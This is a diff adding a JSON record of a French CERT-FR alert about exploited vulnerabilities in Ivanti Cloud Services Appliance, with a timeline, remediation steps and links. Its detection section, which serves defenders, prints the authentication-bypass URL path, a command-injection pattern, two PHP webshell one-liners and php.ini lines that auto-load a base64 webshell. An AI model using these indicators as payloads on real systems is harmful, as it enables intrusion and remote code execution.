@@ -1,0 +1,104 @@
+{
+    "$ref": "https://www.cert.ssi.gouv.fr/openapi.json",
+    "affected_systems": [
+        {
+            "description": "Ivanti Cloud Services Appliance (CSA) versions antérieures à 5.0.2",
+            "product": {
+                "name": "Cloud Service Appliance (CSA)",
+                "vendor": {
+                    "name": "Ivanti",
+                    "scada": false
+                }
+            }
+        }
+    ],
+    "affected_systems_content": "Une chaine d’exploitation complète est connue pour les produits Ivanti Cloud Services Appliance de versions antérieures à 5.0, notamment les versions 4.6 n’ayant pas appliqué le correctif 519.\nLes vulnérabilités CVE-2024-8190, CVE-2024-8963 et CVE-2024-9380 ont été exploitées avant la publication de ce correctif.\nLe CERT-FR n’a pas connaissance d’une chaine d’exploitation impactant les versions 5.0.x.",
+    "closed_at": "2025-03-31",
+    "content": "## Recherche de compromission\n\nDes traces d’exploitation sont identifiables dans les journaux `/var/log/messages-<date>.tar.gz` ou dans des journaux de reverse-proxy en privilégiant la période du 4 au 15 septembre 2024 :\n1. requête HTTP GET vers l'URL `/client/index.php%3F.php/gsb/users.php` (CVE-2024-8963). Les attaquants peuvent utiliser des moyens d’obscurcissement pour contourner ce motif de détection ; \n2. suivie d'une requête HTTP POST vers l'URL `/gsb/datetime.php` (CVE-2024-8190) ;\n3. présence de `PGPASSWORD` pouvant indiquer une manipulation de la base de donnée contenant les informations de connexion ;\n4. présence d'une requête contenant `tripwire --update ;` indiquant une injection de commandes au travers de la page `reports.php`.\n\nDans `/var/log/messages*` et `/var/log/secure*`, des traces d’exécutions de commandes malveillantes peuvent être identifiées :\n* `base64 -d`\n* `tripwire –-update ; <injection de commande>`\n\nL'attaquant peut également utiliser des *webshells* situées dans le dossier `/opt/landesk` contenant uniquement l’une des deux lignes suivantes :\n* `<?php @eval($_REQUEST[<variable>]);  ?>`\n* `<?php system('/bin/sudo '. $_REQUEST[<variable>]);`\n\nIl existe également des combinaisons de ces deux lignes (sans le  `?>` final, avec ou sans guillemet autour de la variable, etc.). Les dates de dernière modification et de création de ces fichiers peuvent avoir été manipulées. \n\nDe plus, des indicateurs de compromission peuvent parfois être observés à la fin du fichier `/etc/php.ini` :\n* `allow_url_include = On`\n* `auto_prepend_file = \"data:;base64,<webshell encodé>\"`\n\nLe CERT-FR recommande par ailleurs de chercher les indicateurs de compromission présentés dans l'article de Fortinet [1].\n\nL'URL permettant d'exploiter la vulnérabilité CVE-2024-8963 a été massivement requêtée. Sa seule présence dans les journaux d'activité n'est donc pas nécessairement révélatrice d'une action malveillante. Il est néanmoins nécessaire de suivre les étapes 4 à 6 présentes dans la section Solution. \n\n## Solution \n\nLa version 5.0.2 de CSA corrige l'ensemble des vulnérabilités présentées. La version 4.6 n'est plus supportée par l'éditeur et ce dernier recommande de mettre à jour vers la version 5.0.2. L’éditeur recommande l’utilisation de deux interfaces réseau, en utilisant `eth0` uniquement pour le réseau interne.\n\nSi vous êtes en présence d'un CSA qui était en version 4.6 et accessible depuis Internet en septembre ou octobre 2024, il est impératif d’effectuer une recherche de traces d’exploitation de vulnérabilité sur l’équipement ou la machine virtuelle, ainsi que de tentatives de latéralisation.\n\nEn cas de compromission ou suspicion de compromission :\n\n1. isoler les équipements compromis du réseau et réaliser un gel de données (instantané pour les machines virtuelles, isolement de l’équipement s’il s’agit d’un équipement physique) à des fins d’investigations approfondies ;\n2. signaler l’événement auprès du CERT-FR en mettant en copie vos éventuels CSIRTs métier ; \n3. reconstruire la solution CSA en version 5.0.2 et son système d’exploitation sur lequel il repose à partir de source éditeur. L'attaquant peut déposer un implant qui ne sera pas supprimé avec la simple réinstallation de l'application ;\n4. réinitialiser tous les secrets de façon générale (mot de passe, certificat, etc.) configurés sur les équipements affectés ; \n5. réinitialiser tous les secrets d’authentification susceptibles d’avoir transités sur les équipements affectés (si applicable) ;\n6. vérifier que l'ensemble des utilisateurs du système sont légitimes ; \n7. rechercher toutes traces de latéralisation sur le reste du système d’information, notamment :\n    * en cherchant les connexions ou tentatives de connexion vers Internet depuis l'équipement compromis ;\n    * puis en cherchant ces adresses IP de destination pour vérifier si d’autres machines ont tenté une connexion ;\n    * en analysant les journaux des EDR ou les journaux Windows pour identifier des connexions depuis l'équipement compromis. \n8. identifier les comptes du domaine Active Directory qui seraient configurés sur l'équipement suspecté puis :\n    * vérifier l'activité réalisée à partir de ce compte ;\n    * réinitialiser les secrets associés à ces comptes afin d'éviter que l'attaquant ne puisse réutiliser ailleurs les identifiants éventuellement obtenus sur l'équipement.\n\nLe CERT-FR vous recontactera si nécessaire pour le traitement de l’incident ou vous communiquera des éléments supplémentaires. En cas de suspicion de compromission, il est recommandé de consulter les [bons réflexes en cas d'intrusion sur votre système d'information](https://www.cert.ssi.gouv.fr/les-bons-reflexes-en-cas-dintrusion-sur-un-systeme-dinformation/) [2], ainsi que les fiches réflexe sur la compromission système [3] [4]. \n",
+    "cves": [
+        {
+            "name": "CVE-2024-9380",
+            "url": "https://www.cve.org/CVERecord?id=CVE-2024-9380"
+        },
+        {
+            "name": "CVE-2024-8963",
+            "url": "https://www.cve.org/CVERecord?id=CVE-2024-8963"
+        },
+        {
+            "name": "CVE-2024-8190",
+            "url": "https://www.cve.org/CVERecord?id=CVE-2024-8190"
+        }
+    ],
+    "links": [
+        {
+            "title": "[2] Les bons réflexes en cas d’intrusion sur un système d’information",
+            "url": "https://www.cert.ssi.gouv.fr/les-bons-reflexes-en-cas-dintrusion-sur-un-systeme-dinformation/"
+        },
+        {
+            "title": "[4] Fiche réflexe Compromission système - Endiguement",
+            "url": "https://www.cert.ssi.gouv.fr/fiche/CERTFR-2024-RFX-006/"
+        },
+        {
+            "title": "[3] Fiche réflexe Compromission système - Qualification",
+            "url": "https://www.cert.ssi.gouv.fr/fiche/CERTFR-2024-RFX-005/"
+        },
+        {
+            "title": "Avis CERTFR-2024-AVI-0851 du 09 octobre 2024",
+            "url": "https://www.cert.ssi.gouv.fr/avis/CERTFR-2024-AVI-0851/"
+        },
+        {
+            "title": "Bulletin d'actualité CERTFR-2024-ACT-045 du 14 octobre 2024",
+            "url": "https://www.cert.ssi.gouv.fr/actualite/CERTFR-2024-ACT-045/"
+        },
+        {
+            "title": "Avis CERTFR-2024-AVI-0796 du 20 septembre 2024",
+            "url": "https://www.cert.ssi.gouv.fr/avis/CERTFR-2024-AVI-0796/"
+        },
+        {
+            "title": "[1] Billet de blogue de FortiGuard Labs Threat Research du 11 octobre 2024 ",
+            "url": "https://www.fortinet.com/blog/threat-research/burning-zero-days-suspected-nation-state-adversary-targets-ivanti-csa"
+        }
+    ],
+    "reference": "CERTFR-2024-ALE-013",
+    "revisions": [
+        {
+            "description": "    Clôture de l'alerte. Cela ne signifie pas la fin d'une menace. Seule l'application de la mise à jour permet de vous prémunir contre l'exploitation de la vulnérabilité correspondante.",
+            "revision_date": "2025-03-31T00:00:00.000000"
+        },
+        {
+            "description": "Version initiale",
+            "revision_date": "2024-10-22T00:00:00.000000"
+        },
+        {
+            "description": "Correction d'un marqueur présent dans les fichiers de /var/log/",
+            "revision_date": "2024-10-25T00:00:00.000000"
+        }
+    ],
+    "risks": [
+        {
+            "description": "Exécution de code arbitraire à distance"
+        },
+        {
+            "description": "Contournement de la politique de sécurité"
+        }
+    ],
+    "summary": "Ivanti a publié plusieurs avis de sécurité sur des vulnérabilités affectant CSA qui sont activement exploitées :\n* le 10 septembre 2024, Ivanti a publié un avis de sécurité concernant la vulnérabilité CVE-2024-8190 qui permet à un attaquant, authentifié en tant qu'administrateur, d'exécuter du code arbitraire à distance sur un équipement CSA ;\n* le 13 septembre 2024, l'éditeur a ajouté que cette vulnérabilité était activement exploitée dans le cadre d'attaques ciblées ;\n* le 16 septembre 2024, le CERT-FR a eu connaissance de codes d'exploitation publics pour la vulnérabilité CVE-2024-8190 ;\n* le 19 septembre 2024, Ivanti a publié un nouvel avis de sécurité affectant CSA. La vulnérabilité CVE-2024-8963 permet à un attaquant non authentifié de contourner l'authentification et d'obtenir les droits administrateur ;\n* le 8 octobre 2024, Ivanti a publié un nouvel avis de sécurité affectant les CSA versions 5.0.1 et antérieures. Les vulnérabilités CVE-2024-9379 et CVE-2024-9380, combinées à la vulnérabilité CVE-2024-8963 présente sur les CSA versions 4.6 antérieures au correctif 519, permettent d’exécuter du code arbitraire à distance ;\n* le 11 octobre 2024 l'éditeur Fortinet a publié un billet de blogue [1] détaillant les exploitations constatées lors d'une opération de réponse à incidents.\n \nL'éditeur a précisé que les vulnérabilités CVE-2024-8190 et CVE-2024-8963 étaient activement exploitées et a connaissance d’un nombre limité d’exploitations des vulnérabilités CVE-2024-9379 et CVE-2024-9380, combinées à la vulnérabilité CVE-2024-8963 sur les CSA en versions antérieures à 5.0 uniquement. \n\n**Le CERT-FR a connaissance de plusieurs compromissions dans lesquelles ces vulnérabilités ont été exploitées.**",
+    "title": "Exploitations de vulnérabilités dans Ivanti Cloud Services Appliance (CSA)",
+    "vendor_advisories": [
+        {
+            "published_at": "2024-10-10",
+            "title": "Bulletin de sécurité Ivanti",
+            "url": "https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-CSA-Cloud-Services-Appliance-CVE-2024-9379-CVE-2024-9380-CVE-2024-9381?language=en_US"
+        },
+        {
+            "published_at": "2024-09-19",
+            "title": "Bulletin de sécurité Ivanti",
+            "url": "https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-CSA-4-6-Cloud-Services-Appliance-CVE-2024-8963?language=en_US"
+        },
+        {
+            "published_at": "2024-09-10",
+            "title": "Bulletin de sécurité Ivanti",
+            "url": "https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Cloud-Service-Appliance-CSA-CVE-2024-8190?language=en_US"
+        }
+    ]
+}
